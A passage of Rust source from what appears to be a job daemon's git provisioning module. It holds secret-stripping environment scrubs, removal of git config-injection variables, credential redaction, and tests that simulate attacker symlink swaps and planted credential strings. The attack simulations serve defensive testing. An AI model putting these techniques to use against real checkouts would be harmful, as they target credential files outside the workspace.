    // Strip the daemon's own engine-connection secrets from the inherited
    // environment before spawning git, exactly as the ACP/pipe launch sites do:
    // git runs job-controlled remote URLs and credential/remote helpers, so a
    // hostile repo config or helper could otherwise read `CAMUNDA_*`/`ZEEBE_*`
    // client secrets and basic-auth passwords straight out of the environment.
    for k in crate::slot::SENSITIVE_DAEMON_ENV {
        cmd.env_remove(k);
    }
    // Strip git's environment-based config-injection channels. git applies
    // GIT_CONFIG_COUNT/GIT_CONFIG_KEY_<n>/GIT_CONFIG_VALUE_<n> as the
    // HIGHEST-priority config — above every on-disk file — so they bypass
    // `git_isolated`'s GIT_CONFIG_GLOBAL/SYSTEM=/dev/null file isolation
    // entirely, letting a tainted daemon environment rewrite (`url.*.insteadOf`)
    // config for the authenticated push. Scrub them from every git child so no
    // inherited env can inject config. TRANSPORT channels (GIT_SSH_COMMAND,
    // GIT_ASKPASS, …) are intentionally left intact — they are the operator's
    // provisioning authentication and the agent cannot set the daemon's env; see
    // `GIT_CONFIG_INJECTION_ENV`.
    for k in GIT_CONFIG_INJECTION_ENV {
        cmd.env_remove(k);
    }
    // GIT_CONFIG_COUNT's indexed entries are unbounded; removing the count
    // disables them, but strip every present GIT_CONFIG_KEY_<n>/VALUE_<n> too so
    // a mismatched/stale count can never resurrect one.
    for (k, _) in std::env::vars_os() {
        if k.to_str()
            .is_some_and(|s| s.starts_with("GIT_CONFIG_KEY_") || s.starts_with("GIT_CONFIG_VALUE_"))
        {
            cmd.env_remove(&k);
        }
    }
    cmd.stdin(Stdio::null())
        // stdout is captured (bounded) so finalize's `rev-list` / `rev-parse`
        // can read it; a job-controlled remote flooding it is capped to
        // `GIT_STDOUT_TAIL` like stderr, so it can never exhaust memory.
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    // Give git the same parent-death/process-group cleanup as agent children.
    // `kill_on_drop` only runs on a graceful daemon shutdown; a `kill -9` of the
    // daemon mid-clone would otherwise orphan git (and any transport/credential
    // helper it spawned), which could keep mutating the run directory while the
    // job is redelivered. Its own process group + PDEATHSIG/watchdog tears the
    // whole git tree down with the daemon.
    #[cfg(unix)]
    cmd.process_group(0);
    #[cfg(unix)]
    crate::pdeath::arm(&mut cmd);
    let mut child = cmd.spawn().context("spawning git")?;
    #[cfg(unix)]
    let gpid = child.id();
    #[cfg(unix)]
    if let Some(pid) = gpid {
        crate::pdeath::watch(pid);
    }
    // Cancellation cleanup: if this future is dropped mid-clone/fetch (e.g. the
    // slot aborts `execute` on lease loss), the `wait_with_output` future — and
    // the `child` it owns — is dropped, but `kill_on_drop` reaps only the direct
    // git leader; transports / credential helpers it spawned share git's process
    // group and would leak, still mutating the run directory while the job is
    // redelivered. The guard SIGKILLs the whole git group on drop. Disarmed once
    // git has completed (or we have already killed the group on timeout), so a
    // recycled pid is never re-signalled.
    #[cfg(unix)]
    let mut group_guard = crate::pdeath::GroupGuard::new(gpid);
    // Drain git's stderr to EOF while retaining only a bounded tail: the pipe is
    // always read so git never blocks on a full buffer, but a job-controlled
    // repository/remote helper emitting unbounded progress/diagnostics can't grow
    // this without limit and exhaust the daemon. stdout is discarded (`null`)
    // above; only a short stderr tail is ever needed for the error message.
    let stderr = child.stderr.take();
    let stdout = child.stdout.take();
    let wait = async {
        let drain_err = async {
            match stderr {
                Some(e) => drain_capped(e, GIT_STDERR_TAIL).await.0,
                None => Vec::new(),
            }
        };
        let drain_out = async {
            match stdout {
                Some(o) => drain_capped(o, GIT_STDOUT_TAIL).await,
                None => (Vec::new(), false),
            }
        };
        let (status, err, out) = tokio::join!(child.wait(), drain_err, drain_out);
        (status, (err, out))
    };
    let (status, (stderr_tail, (stdout_tail, stdout_truncated))) =
        match tokio::time::timeout(timeout, wait).await {
        Ok(res) => {
            // git finished within the timeout, but a credential/remote helper it
            // spawned can outlive the leader while sharing git's process group
            // (`child.wait()` reaped only the direct git leader). Tear the whole
            // group down before disarming the guard — mirroring the ACP and pipe
            // paths — so a lingering helper can't keep mutating the run directory
            // after provisioning "succeeds". `terminate_group_and_reap` gates on
            // `group_alive`, so this is a no-op when git left nothing behind and
            // never re-signals a pid that may have been recycled.
            #[cfg(unix)]
            {
                crate::pdeath::terminate_group_and_reap(&mut child, gpid, Duration::from_secs(3))
                    .await;
                group_guard.disarm();
            }
            res
        }
        Err(_) => {
            // Timed out: SIGKILL the whole group (not just the leader that
            // `kill_on_drop` reaps) so a helper git spawned cannot outlive it.
            // Re-probe `group_alive` immediately before signalling — mirroring
            // `terminate_group_and_reap` and the success path above: the `wait`
            // future (and its `child.wait()`) is dropped when the timeout fires,
            // so if git and every descendant exited in that interval the pgid can
            // be released and recycled by an unrelated group before this call.
            // Only signal while the group is genuinely still present, so a timeout
            // never SIGKILLs a recycled pid — upholding the guard's guarantee.
            #[cfg(unix)]
            if let Some(pid) = gpid {
                if crate::pdeath::group_alive(pid) {
                    crate::pdeath::sigkill_group(pid);
                }
            }
            #[cfg(unix)]
            group_guard.disarm();
            // Reap the just-killed leader (bounded) before returning. The `wait`
            // future — which owns `child` — was dropped when the timeout fired,
            // and `kill_on_drop` signals a dropped child but does *not* guarantee
            // it is reaped; without an explicit wait, repeated clone/fetch
            // timeouts would accumulate zombie git leaders in the long-lived
            // daemon. The timeout bounds the wait so a wedged (uninterruptible)
            // child cannot hang the slot.
            let _ = tokio::time::timeout(Duration::from_secs(3), child.wait()).await;
            bail!(
                "git {} timed out after {}s",
                args.first().map(String::as_str).unwrap_or(""),
                timeout.as_secs()
            );
        }
    };
    let status = status.context("waiting for git")?;
    if !status.success() {
        // Show the *last* 500 chars of the retained tail — a git failure message
        // (e.g. `fatal: …`) lands at the very end of stderr.
        let stderr = String::from_utf8_lossy(&stderr_tail);
        let chars: Vec<char> = stderr.chars().collect();
        let start = chars.len().saturating_sub(500);
        let tail: String = chars[start..].iter().collect();
        // Git can echo a credential-bearing remote URL in its fatal diagnostics
        // (e.g. `unable to access 'https://user:pat@host/...'`); this tail is
        // propagated into the job-failure/daemon logs, so scrub any embedded
        // userinfo before including it.
        let tail = scrub_url_credentials(&tail);
        bail!(
            "git {} exited with {}: {}",
            args.first().map(String::as_str).unwrap_or(""),
            status,
            tail
        );
    }
    Ok((
        String::from_utf8_lossy(&stdout_tail).into_owned(),
        stdout_truncated,
    ))
}

/// Bytes of a git child's captured stdout *tail* retained for finalize's
/// `rev-list`/`rev-parse` reads. Commit enumerations are a handful of 40-char
/// SHAs per line; 1 MiB bounds even a pathological graph scan while leaving
/// legitimate output intact.
const GIT_STDOUT_TAIL: usize = 1024 * 1024;

/// Most side branches finalize will run per-branch reachability checks on. The
/// 1 MiB stdout tail still permits tens of thousands of short refs, and each
/// parsed branch costs serial `rev-parse`/`rev-list` processes — so an agent
/// that manufactures a huge branch set could keep finalize running far past its
/// own run timeout. A real run has a handful of branches; past this bound the
/// scan can no longer be trusted to be timely, so finalize fails closed
/// (retains the run dir) rather than sweep an unbounded set.
const MAX_SIDE_BRANCH_SCAN: usize = 512;

/// Most distinct HEAD reflog positions finalize's detached-commit net will
/// classify. The net reads the WHOLE reflog (no `-n` cap) so a buried abandoned
/// commit cannot scroll out of a fixed window, but each uncovered position costs
/// serial `for-each-ref`/`rev-list` processes — so an agent that inflates its
/// own HEAD reflog past this bound could keep finalize running far past its run
/// timeout. A real run visits a handful of positions; past this bound the scan
/// is treated as unbounded and finalize fails closed (retains the run dir).
const MAX_REFLOG_SCAN: usize = 512;

/// Bytes of a child stream's *tail* retained for diagnostics. The stream is
/// still drained fully; only the last `GIT_STDERR_TAIL` bytes are kept.
const GIT_STDERR_TAIL: usize = 8 * 1024;

/// Read `reader` to EOF, retaining only its last `cap` bytes. Always consumes the
/// whole stream (so the writer never blocks on a full pipe) while bounding memory
/// to `cap` regardless of how much a job-controlled process emits. The returned
/// `bool` is `true` when the stream exceeded `cap` and leading bytes were
/// DROPPED — a security scrub that must see the COMPLETE listing uses it to fail
/// closed rather than act on a silently truncated tail.
async fn drain_capped<R>(mut reader: R, cap: usize) -> (Vec<u8>, bool)
where
    R: tokio::io::AsyncRead + Unpin,
{
    use tokio::io::AsyncReadExt;
    let mut buf: Vec<u8> = Vec::new();
    let mut chunk = [0u8; 8192];
    let mut truncated = false;
    loop {
        match reader.read(&mut chunk).await {
            Ok(0) | Err(_) => break,
            Ok(n) => {
                buf.extend_from_slice(&chunk[..n]);
                if buf.len() > cap {
                    let excess = buf.len() - cap;
                    buf.drain(..excess);
                    truncated = true;
                }
            }
        }
    }
    (buf, truncated)
}

mod tests {
    use super::*;

    #[test]
    fn hex_sha_validation() {
        assert!(is_hex_sha("deadbeef"));
        assert!(is_hex_sha("0123456789abcdef0123456789abcdef01234567"));
        assert!(!is_hex_sha("xyz"));
        assert!(!is_hex_sha("short"));
        assert!(!is_hex_sha("0123456789abcdef0123456789abcdef012345678")); // 41 chars
    }

    #[test]
    fn scrub_credentials_from_git_stderr() {
        // A credential-bearing URL echoed in a git diagnostic is redacted.
        let line = "fatal: unable to access 'https://x-access-token:ghp_SECRET@github.com/org/repo.git/': The requested URL returned error: 403";
        let scrubbed = scrub_url_credentials(line);
        assert!(!scrubbed.contains("ghp_SECRET"));
        assert!(!scrubbed.contains("x-access-token"));
        assert!(scrubbed.contains("https://github.com/org/repo.git/"));
        assert!(scrubbed.contains("error: 403"));
        // Credential-free URLs and plain text are left untouched.
        assert_eq!(
            scrub_url_credentials("cloning https://github.com/org/repo.git now"),
            "cloning https://github.com/org/repo.git now"
        );
        assert_eq!(scrub_url_credentials("no url here"), "no url here");
    }

    #[test]
    fn scrub_preserves_ssh_username() {
        // ssh:// userinfo is a login name, not a secret git delivers via a
        // credential helper — stripping it would corrupt the remote and break
        // the fetch, so it must be left intact.
        assert_eq!(
            scrub_url_credentials("ssh://git@example.com/org/repo.git"),
            "ssh://git@example.com/org/repo.git"
        );
        // git:// likewise carries no credential-helper secret in its userinfo.
        assert_eq!(
            scrub_url_credentials("git://user@host/org/repo.git"),
            "git://user@host/org/repo.git"
        );
        // …while an http(s) PAT is still scrubbed.
        let token = "x-access-token:s3cr3t";
        let with_creds = format!("https://{token}@github.com/org/repo.git");
        assert_eq!(
            scrub_url_credentials(&with_creds),
            "https://github.com/org/repo.git"
        );
    }

    #[test]
    fn origin_scrub_strips_clone_url_credentials() {
        // The URL rewritten into `remote.origin.url` after a credential-bearing
        // clone must never retain the PAT, while a credential-free URL is left
        // byte-for-byte unchanged (so the rewrite is a harmless no-op). Build the
        // userinfo at runtime so no credential-like literal is stored in source.
        let token = "x-access-token:s3cr3t";
        let with_creds = format!("https://{token}@github.com/org/repo.git");
        let scrubbed = scrub_url_credentials(&with_creds);
        assert!(!scrubbed.contains("s3cr3t"));
        assert!(!scrubbed.contains('@'));
        assert_eq!(scrubbed, "https://github.com/org/repo.git");
        assert_eq!(
            scrub_url_credentials("https://github.com/org/repo.git"),
            "https://github.com/org/repo.git"
        );
    }

    #[test]
    fn split_url_credential_lifts_secret_out_of_argv() {
        // A `user:token@` URL yields a credential-free URL for argv plus the
        // credential (host-scoped) for out-of-band delivery. Build the userinfo
        // at runtime so no credential-like literal is stored in source.
        let (user, pass) = ("x-access-token", "s3cr3tPAT");
        let url = format!("https://{user}:{pass}@github.com/org/repo.git");
        let (argv_url, cred) = split_url_credential(&url);
        assert_eq!(argv_url, "https://github.com/org/repo.git");
        assert!(!argv_url.contains(pass) && !argv_url.contains('@'));
        let cred = cred.expect("credential lifted from userinfo URL");
        assert_eq!(cred.host, "github.com");
        assert_eq!(cred.username, user);
        assert_eq!(cred.password, pass);

        // Token-as-username form (`https://<token>@host`) becomes username with
        // an empty password, mirroring git's own interpretation.
        let url = format!("https://{pass}@github.com/org/repo.git");
        let (argv_url, cred) = split_url_credential(&url);
        assert_eq!(argv_url, "https://github.com/org/repo.git");
        let cred = cred.expect("token-as-username credential lifted");
        assert_eq!(cred.username, pass);
        assert!(cred.password.is_empty());
        assert_eq!(cred.host, "github.com");

        // An explicit port is stripped from the scoped host (git sends `host`
        // without the default-port suffix; scope on the bare host).
        let url = format!("https://{user}:{pass}@example.com:8443/o/r.git");
        let cred = split_url_credential(&url).1.expect("credential expected");
        assert_eq!(cred.host, "example.com");

        // A credential-free URL is returned byte-for-byte with no credential.
        let plain = "https://github.com/org/repo.git";
        let (argv_url, cred) = split_url_credential(plain);
        assert_eq!(argv_url, plain);
        assert!(cred.is_none());

        // A non-URL (e.g. a local path) is passed through with no credential.
        let (argv_url, cred) = split_url_credential("/tmp/local/repo");
        assert_eq!(argv_url, "/tmp/local/repo");
        assert!(cred.is_none());

        // A non-HTTP(S) scheme carries a *login*, not a secret: `scrub_url_credentials`
        // deliberately leaves its userinfo intact, so lifting a credential here would
        // double-deliver it (userinfo stays in the argv URL *and* a helper credential
        // is emitted). No credential is lifted and the URL is returned unchanged.
        let url = format!("ssh://{user}:{pass}@git.example.com/o/r.git");
        let (argv_url, cred) = split_url_credential(&url);
        assert_eq!(argv_url, url);
        assert!(
            cred.is_none(),
            "no credential must be lifted from a non-HTTP scheme"
        );
        // The canonical `ssh://git@host` login form is likewise preserved verbatim.
        let ssh = "ssh://git@git.example.com/o/r.git";
        let (argv_url, cred) = split_url_credential(ssh);
        assert_eq!(argv_url, ssh);
        assert!(cred.is_none());
    }

    #[test]
    fn submodule_configs_are_scrubbed_of_credentials() {
        // A `--recurse-submodules` clone writes each submodule's remote URL into
        // `.git/modules/**/config`; the scrub must strip credentials from those
        // nested configs (recursively), leaving credential-free URLs behind.
        let tmp = std::env::temp_dir().join(format!("nano-sub-scrub-{}", std::process::id()));
        let nested = tmp
            .join(".git")
            .join("modules")
            .join("sub")
            .join("modules")
            .join("inner");
        std::fs::create_dir_all(&nested).unwrap();
        let token = format!("{}:{}", "x-access-token", "s3cr3tPAT");
        let outer_cfg = tmp.join(".git").join("modules").join("sub").join("config");
        let inner_cfg = nested.join("config");
        let body =
            |host: &str| format!("[remote \"origin\"]\n\turl = https://{token}@{host}/o/r.git\n");
        std::fs::write(&outer_cfg, body("h1")).unwrap();
        std::fs::write(&inner_cfg, body("h2")).unwrap();

        // The superproject's own top-level `.git/config` holds a
        // `submodule.<name>.url` entry that `submodule init` copied; it must be
        // scrubbed too.
        let top_cfg = tmp.join(".git").join("config");
        std::fs::write(
            &top_cfg,
            format!("[submodule \"sub\"]\n\turl = https://{token}@h3/o/r.git\n"),
        )
        .unwrap();

        scrub_submodule_config_credentials(&tmp).expect("scrub submodule configs");

        for (cfg, host) in [(&outer_cfg, "h1"), (&inner_cfg, "h2"), (&top_cfg, "h3")] {
            let got = std::fs::read_to_string(cfg).unwrap();
            assert!(
                !got.contains("s3cr3tPAT"),
                "credential left in {}: {got}",
                cfg.display()
            );
            assert!(got.contains(&format!("https://{host}/o/r.git")));
        }
        let _ = std::fs::remove_dir_all(&tmp);
    }

    #[test]
    fn submodule_scrub_is_noop_without_modules_dir() {
        // No `.git/modules` (the common no-submodules clone) is a clean no-op.
        let tmp = std::env::temp_dir().join(format!("nano-sub-none-{}", std::process::id()));
        std::fs::create_dir_all(tmp.join(".git")).unwrap();
        scrub_submodule_config_credentials(&tmp).expect("no-op when no submodules");
        let _ = std::fs::remove_dir_all(&tmp);
    }

    #[test]
    #[cfg(unix)]
    fn submodule_scrub_skips_symlinked_modules_root() {
        // A symlink planted at `.git/modules` must NOT be traversed: `exists()`
        // follows links, so the scrub would otherwise walk (and rewrite) a config
        // OUTSIDE the checkout. The `symlink_metadata` root guard treats the link
        // as "nothing to scrub" and leaves the target untouched.
        let tmp = std::env::temp_dir().join(format!("nano-sub-link-{}", std::process::id()));
        let outside = std::env::temp_dir().join(format!("nano-sub-out-{}", std::process::id()));
        std::fs::create_dir_all(tmp.join(".git")).unwrap();
        std::fs::create_dir_all(&outside).unwrap();
        let token = format!("{}:{}", "x-access-token", "s3cr3tPAT");
        let outside_cfg = outside.join("config");
        std::fs::write(
            &outside_cfg,
            format!("[remote \"origin\"]\n\turl = https://{token}@h/o/r.git\n"),
        )
        .unwrap();
        std::os::unix::fs::symlink(&outside, tmp.join(".git").join("modules")).unwrap();

        scrub_submodule_config_credentials(&tmp).expect("symlinked root is a no-op");

        // The out-of-checkout config was left byte-for-byte untouched.
        let got = std::fs::read_to_string(&outside_cfg).unwrap();
        assert!(
            got.contains("s3cr3tPAT"),
            "scrub must not follow the symlinked root"
        );
        let _ = std::fs::remove_dir_all(&tmp);
        let _ = std::fs::remove_dir_all(&outside);
    }

    #[test]
    #[cfg(unix)]
    fn submodule_scrub_skips_symlinked_subdirectory() {
        // A symlink planted at an INTERIOR node of the `.git/modules` tree (a
        // directory entry swapped for a symlink to a dir outside the checkout)
        // must not be descended into: the no-follow walker (openat2-pinned on
        // Linux, `file_type()`-guarded elsewhere) skips the link, so a `config`
        // beneath the link target is never rewritten, while a real sibling
        // `config` is still scrubbed.
        let tmp = std::env::temp_dir().join(format!("nano-sub-innerlink-{}", std::process::id()));
        let outside =
            std::env::temp_dir().join(format!("nano-sub-innerout-{}", std::process::id()));
        let modules = tmp.join(".git").join("modules");
        std::fs::create_dir_all(modules.join("real")).unwrap();
        std::fs::create_dir_all(&outside).unwrap();
        let token = format!("{}:{}", "x-access-token", "s3cr3tPAT");
        let body =
            |host: &str| format!("[remote \"origin\"]\n\turl = https://{token}@{host}/o/r.git\n");

        // A genuine nested submodule config (must be scrubbed).
        let real_cfg = modules.join("real").join("config");
        std::fs::write(&real_cfg, body("h-real")).unwrap();

        // An out-of-checkout config reachable only through a symlinked entry
        // (must be left untouched).
        let outside_cfg = outside.join("config");
        std::fs::write(&outside_cfg, body("h-out")).unwrap();
        std::os::unix::fs::symlink(&outside, modules.join("evil")).unwrap();

        scrub_submodule_config_credentials(&tmp).expect("scrub skips the symlinked subdir");

        let real = std::fs::read_to_string(&real_cfg).unwrap();
        assert!(
            !real.contains("s3cr3tPAT"),
            "the real nested config must be scrubbed"
        );
        let out = std::fs::read_to_string(&outside_cfg).unwrap();
        assert!(
            out.contains("s3cr3tPAT"),
            "the scrub must not follow a symlinked subdirectory out of the checkout"
        );
        let _ = std::fs::remove_dir_all(&tmp);
        let _ = std::fs::remove_dir_all(&outside);
    }

    #[test]
    #[cfg(all(unix, target_os = "linux"))]
    fn submodule_scrub_refuses_config_swapped_to_symlink_after_triage() {
        // The post-triage symlink-swap race the pinned walk closes: a `config`
        // leaf that is a regular file when the walker stats it but is swapped
        // for a symlink (to a credential-bearing file OUTSIDE the checkout)
        // before its relative open must be REFUSED (`ELOOP`) — the scrub leaves
        // the outside target byte-for-byte untouched. The pre-hardening
        // `file_type()`-then-open-by-path walker would follow the link and
        // rewrite the target; the pinned no-follow open must not.
        let tmp = std::env::temp_dir().join(format!("nano-sub-swap-{}", std::process::id()));
        let outside = std::env::temp_dir().join(format!("nano-sub-swapout-{}", std::process::id()));
        let modules = tmp.join(".git").join("modules");
        let sub = modules.join("sub");
        std::fs::create_dir_all(&sub).unwrap();
        std::fs::create_dir_all(&outside).unwrap();
        let token = format!("{}:{}", "x-access-token", "s3cr3tPAT");

        // The out-of-checkout config the swapped symlink points at (must be
        // left untouched).
        let outside_cfg = outside.join("config");
        std::fs::write(
            &outside_cfg,
            format!("[remote \"origin\"]\n\turl = https://{token}@h-out/o/r.git\n"),
        )
        .unwrap();

        // Triage sees a real, credential-free `config` regular file...
        let leaf = sub.join("config");
        std::fs::write(&leaf, "[remote \"origin\"]\n\turl = https://h/o/r.git\n").unwrap();
        // ...which the attacker swaps for a symlink to the outside config
        // before the walker's relative open.
        std::fs::remove_file(&leaf).unwrap();
        std::os::unix::fs::symlink(&outside_cfg, &leaf).unwrap();

        // The scrub must not follow the swapped symlink: it either skips the
        // entry (ELOOP) or fails outright, but never rewrites the target.
        let _ = scrub_submodule_config_credentials(&tmp);

        let out = std::fs::read_to_string(&outside_cfg).unwrap();
        assert!(
            out.contains("s3cr3tPAT"),
            "the scrub must not follow a post-triage symlink swap out of the checkout"
        );
        let _ = std::fs::remove_dir_all(&tmp);
        let _ = std::fs::remove_dir_all(&outside);
    }

    /// Env var that re-enters this test binary as the low-fd-limit *child*: its
    /// value is the prepared wide-tree root to scrub. Keeping the work in a
    /// fresh process lets us pin `RLIMIT_NOFILE` just above the ancestry-chain
    /// depth without disturbing the parent harness's own descriptors.
    #[cfg(all(unix, target_os = "linux"))]
    const FD_LIMIT_CHILD_ENV: &str = "NANO_SCRUB_FD_LIMIT_CHILD";

    #[test]
    #[cfg(all(unix, target_os = "linux"))]
    fn submodule_scrub_wide_tree_does_not_exhaust_fds() {
        // Child role: a parent invocation (below) re-exec'd this test binary
        // with the wide-tree root in FD_LIMIT_CHILD_ENV. Pin the soft fd limit
        // just above current usage + the walk's bounded depth, then scrub. A
        // breadth-first walk that retains one open handle per sibling would hit
        // EMFILE here and exit non-zero; the depth-bounded walk, which holds
        // only the current ancestry chain, stays under the limit and exits 0.
        if let Ok(root) = std::env::var(FD_LIMIT_CHILD_ENV) {
            // Count currently-open descriptors so the cap tracks the harness's
            // real baseline rather than a guessed absolute number.
            let base = std::fs::read_dir("/proc/self/fd")
                .map(|d| d.count())
                .unwrap_or(32);
            // Headroom covers the deepest ancestry chain of pinned dir handles
            // plus their readdir streams and the single open config file — a
            // small constant, and far below the sibling count the parent builds.
            let want = base as u64 + 24;
            let mut rl = libc::rlimit {
                rlim_cur: 0,
                rlim_max: 0,
            };
            // SAFETY: plain libc rlimit get/set on a zeroed struct.
            unsafe {
                if libc::getrlimit(libc::RLIMIT_NOFILE, &mut rl) != 0 {
                    std::process::exit(3);
                }
                rl.rlim_cur = want.min(rl.rlim_max);
                if libc::setrlimit(libc::RLIMIT_NOFILE, &rl) != 0 {
                    std::process::exit(3);
                }
            }
            let code = match scrub_submodule_config_credentials(std::path::Path::new(&root)) {
                Ok(()) => 0,
                Err(_) => 2, // EMFILE (or any failure) under the low cap
            };
            std::process::exit(code);
        }

        // Parent role: build a *wide* tree — many sibling submodule configs under
        // one `.git/modules` — then run the scrub in a child pinned to a low fd
        // limit (above). `n` must exceed the child's fd headroom so a per-sibling
        // handle leak is forced to fail there.
        let tmp = std::env::temp_dir().join(format!("nano-sub-wide-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&tmp);
        let modules = tmp.join(".git").join("modules");
        let token = format!("{}:{}", "x-access-token", "s3cr3tPAT");
        let n = 200; // comfortably above the child's (baseline + depth) fd cap
        let mut cfgs = Vec::new();
        for i in 0..n {
            let d = modules.join(format!("sub{i}"));
            std::fs::create_dir_all(&d).unwrap();
            let c = d.join("config");
            std::fs::write(
                &c,
                format!("[remote \"origin\"]\n\turl = https://{token}@h/o/r{i}.git\n"),
            )
            .unwrap();
            cfgs.push(c);
        }

        let exe = std::env::current_exe().expect("test binary path");
        let status = std::process::Command::new(exe)
            .args([
                "--exact",
                "--nocapture",
                "provision::tests::submodule_scrub_wide_tree_does_not_exhaust_fds",
            ])
            .env(FD_LIMIT_CHILD_ENV, &tmp)
            .status()
            .expect("spawn low-fd-limit scrub child");
        assert!(
            status.success(),
            "wide-tree scrub exhausted the fd limit (exit {:?}): the walk must bound \
             open directory handles by depth, not by sibling count",
            status.code()
        );

        // Belt-and-braces: the child really scrubbed this tree (guards against a
        // filter that silently matched zero tests — then these still hold the PAT).
        for c in &cfgs {
            let got = std::fs::read_to_string(c).unwrap();
            assert!(
                !got.contains("s3cr3tPAT"),
                "every wide-tree config scrubbed: {c:?}"
            );
        }
        let _ = std::fs::remove_dir_all(&tmp);
    }

    #[test]
    fn fetch_head_scrub_strips_credentials() {
        // `git fetch <credential-URL>` records the source URL in
        // `.git/FETCH_HEAD`; the scrub must strip the PAT while leaving the rest
        // of the line intact. A missing file is a clean no-op.
        let tmp = std::env::temp_dir().join(format!("nano-fetchhead-{}", std::process::id()));
        std::fs::create_dir_all(tmp.join(".git")).unwrap();
        // No FETCH_HEAD yet: no-op.
        scrub_fetch_head(&tmp).expect("no-op when FETCH_HEAD absent");

        let token = format!("{}:{}", "x-access-token", "s3cr3tPAT");
        let fetch_head = tmp.join(".git").join("FETCH_HEAD");
        std::fs::write(
            &fetch_head,
            format!("deadbeef\t\tbranch 'main' of https://{token}@github.com/o/r.git\n"),
        )
        .unwrap();

        scrub_fetch_head(&tmp).expect("scrub FETCH_HEAD");

        let got = std::fs::read_to_string(&fetch_head).unwrap();
        assert!(
            !got.contains("s3cr3tPAT"),
            "credential left in FETCH_HEAD: {got}"
        );
        assert!(got.contains("https://github.com/o/r.git"));
        assert!(got.contains("branch 'main' of"));
        let _ = std::fs::remove_dir_all(&tmp);
    }

    /// A throwaway git repo on `main` with one commit, for branch-cut tests.
    /// Returns the workspace path (caller removes it).
    async fn git_workspace(tag: &str) -> CwdHandle {
        let uniq = format!(
            "nano-branchcut-{tag}-{}-{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        );
        let dir = std::env::temp_dir().join(uniq);
        std::fs::create_dir_all(&dir).unwrap();
        // Canonicalize away any symlinked temp-dir ancestor (macOS /var) so the
        // no-follow open below and the test's own path-based cleanup agree on
        // the real inode.
        let dir = std::fs::canonicalize(&dir).unwrap();
        let handle = CwdHandle::open(&dir).unwrap();
        let t = Duration::from_secs(30);
        git(
            &["init".into(), "-b".into(), "main".into(), "--".into()],
            Some(&handle),
            t,
            None,
        )
        .await
        .unwrap();
        git(
            &[
                "-c".into(),
                "user.email=t@t".into(),
                "-c".into(),
                "user.name=t".into(),
                "commit".into(),
                "--allow-empty".into(),
                "-m".into(),
                "init".into(),
            ],
            Some(&handle),
            t,
            None,
        )
        .await
        .unwrap();
        handle
    }

    /// The on-disk path of a test workspace handle, for path-based cleanup and
    /// file seeding. Tests run on a local filesystem with no concurrent
    /// ancestor swap, so recovering the path is safe here.
    fn dir_path(h: &CwdHandle) -> PathBuf {
        h.path().expect("recover test workspace path")
    }

    fn test_repo() -> crate::envelope::Repository {
        crate::envelope::Repository {
            provider: "github".into(),
            url: "https://github.com/o/r.git".into(),
            ref_: None,
            sha: None,
            depth: None,
            single_branch: false,
            filter: None,
            base_ref: None,
            base_sha: None,
            submodules: false,
            clone_timeout_ms: None,
        }
    }

    #[tokio::test]
    async fn branch_cut_matches_base_case_insensitively() {
        // A configured base of `Main` with the clone on `main` still names the
        // SAME shared base (issue #231): the cut must recognise it
        // case-insensitively and switch to a fallback branch rather than leave
        // the agent committing on — and finalize pushing to — the base.
        let dir = git_workspace("case").await;
        let prep = prepare_work_branch(
            &dir,
            &test_repo(),
            Some("Main"),
            None,
            true,
            "u1",
            Duration::from_secs(30),
        )
        .await;
        let branch = prep.working_branch.expect("a fallback branch is cut");
        assert!(
            branch.starts_with("nano/agent-work/"),
            "expected a fallback branch, got {branch:?}"
        );
        let on = git(
            &["rev-parse".into(), "--abbrev-ref".into(), "HEAD".into()],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        assert_eq!(on.trim(), branch);
        let _ = std::fs::remove_dir_all(dir_path(&dir));
    }

    #[tokio::test]
    async fn branch_cut_rejects_invalid_explicit_create() {
        // A job-controlled `branch.create` that is not a valid branch name must
        // not be honoured: the checkout stays on the base and no working branch
        // is reported (so finalize pushes nothing) instead of the agent
        // committing onto a stranded detached/bogus branch.
        let dir = git_workspace("invalid").await;
        let prep = prepare_work_branch(
            &dir,
            &test_repo(),
            None,
            Some("bad..name"),
            true,
            "u2",
            Duration::from_secs(30),
        )
        .await;
        assert_eq!(prep.working_branch, None);
        let on = git(
            &["rev-parse".into(), "--abbrev-ref".into(), "HEAD".into()],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        assert_eq!(on.trim(), "main", "checkout must stay on the base");
        let _ = std::fs::remove_dir_all(dir_path(&dir));
    }

    #[tokio::test]
    async fn branch_cut_honours_valid_explicit_create() {
        // A valid non-base `branch.create` is checked out verbatim.
        let dir = git_workspace("valid").await;
        let prep = prepare_work_branch(
            &dir,
            &test_repo(),
            None,
            Some("feat/x"),
            true,
            "u3",
            Duration::from_secs(30),
        )
        .await;
        assert_eq!(prep.working_branch.as_deref(), Some("feat/x"));
        let on = git(
            &["rev-parse".into(), "--abbrev-ref".into(), "HEAD".into()],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        assert_eq!(on.trim(), "feat/x");
        let _ = std::fs::remove_dir_all(dir_path(&dir));
    }

    #[tokio::test]
    async fn branch_cut_does_not_treat_non_base_pr_head_as_base() {
        // Regression for the review finding: with no explicit base configured,
        // a checkout on a NON-conventional PR head (e.g. `feat/x`) must NOT be
        // classified as the base merely because it is the checked-out ref.
        // The old `effective_base.or(checked_out)` fallback made
        // `create_names_base("feat/x")` trivially true and diverted the PR head
        // onto a fallback branch instead of advancing it. The agent must stay
        // on `feat/x` so finalize advances the PR head.
        let dir = git_workspace("prhead").await;
        // Move the checkout onto a non-conventional feature branch.
        git(
            &["checkout".into(), "-B".into(), "feat/x".into(), "--".into()],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        let prep = prepare_work_branch(
            &dir,
            &test_repo(), // base_ref: None, and no branch.base override
            None,
            None,
            true,
            "u4",
            Duration::from_secs(30),
        )
        .await;
        assert_eq!(
            prep.working_branch.as_deref(),
            Some("feat/x"),
            "a non-base PR head must be advanced in place, not diverted to a fallback"
        );
        let on = git(
            &["rev-parse".into(), "--abbrev-ref".into(), "HEAD".into()],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        assert_eq!(on.trim(), "feat/x");
        let _ = std::fs::remove_dir_all(dir_path(&dir));
    }

    #[tokio::test]
    async fn branch_cut_still_diverts_conventional_base_checkout() {
